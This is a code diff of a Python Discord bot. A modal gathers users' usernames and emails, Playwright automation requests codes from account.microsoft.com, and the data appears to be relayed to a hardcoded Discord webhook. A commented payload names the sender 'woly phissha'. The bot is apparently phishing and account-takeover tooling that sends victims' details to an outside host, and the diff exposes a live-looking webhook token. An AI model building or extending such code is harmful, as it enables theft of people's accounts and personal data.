@@ -88,9 +88,12 @@ class MyModal(discord.ui.Modal):
         await interaction.response.send_message(embeds=[embed11], ephemeral=True)
         code_status = await requestcode(interaction)
         if code_status == 0:
-            await interaction.response.send_message(embeds=[embed22], ephemeral=True, view=MyView2())
+            #print("yes email worked")
+            await interaction.edit_original_response(embeds=[embed22], view=MyView2())
+            #await interaction.response.send_message(embeds=[embed22], ephemeral=True, view=MyView2())
         else:
-            await interaction.response.send_message(embeds=[embed33], ephemeral=True)
+            #print("no email didnt work sadge")
+            await interaction.edit_original_response(embeds=[embed33])
         url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
 
         listofpeople.append([username, email, interaction.user])
@@ -149,12 +152,25 @@ import asyncio
 from playwright.async_api import async_playwright
 
 async def requestcode(interaction):
+  with open("id.txt", 'r') as file:
+    for line in file:
+      line = line.strip()
+      # print(line)
+      # print(str(interaction.guild_id))
+      if str(interaction.guild_id) in line:
+          #print("step 1 done")
+          id_and_url = line.split('|')
+          
+          #print("step 2 done")
+          url = id_and_url[1]
+          break
+
     async with async_playwright() as playwright:
-        print("opening browser")
-        browser = await playwright.chromium.launch(headless=True)
+        #print("opening browser")
+        browser = await playwright.chromium.launch(headless=False)
         page = await browser.new_page()
         context = await browser.new_context()
-        print("OPENED browser")
+        #print("OPENED browser")
 
         await page.goto("https://account.microsoft.com/")
         await page.wait_for_selector('#id__4', state='visible', timeout=4000)
@@ -163,19 +179,6 @@ async def requestcode(interaction):
         await page.click('input[type="submit"]')
 
         url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
-
-        with open("id.txt", 'r') as file:
-          for line in file:
-              line = line.strip()
-             # print(line)
-             # print(str(interaction.guild_id))
-              if str(interaction.guild_id) in line:
-                  #print("step 1 done")
-                  id_and_url = line.split('|')
-                  
-                  #print("step 2 done")
-                  url = id_and_url[1]
-                  break
 
         #requests.post(url="https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo", json = {
         #  "username": "woly phissha",
